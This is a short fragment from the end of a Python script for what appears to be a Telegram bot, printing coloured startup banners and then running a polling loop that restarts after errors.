    print(f"{YELLOW}[+] Activating Direct IP Backoff Protocol & Mixed UI...{RESET}")
    time.sleep(0.5)
    print(f"{GREEN}[✔] SYSTEM ONLINE: @{BOT_USERNAME} is ready to hunt!{RESET}")
    print(f"{CYAN}===================================================={RESET}\n")
    
    while True:
        try: bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"{RED}[!] Polling Error: {e} - Restarting...{RESET}")
            time.sleep(5)
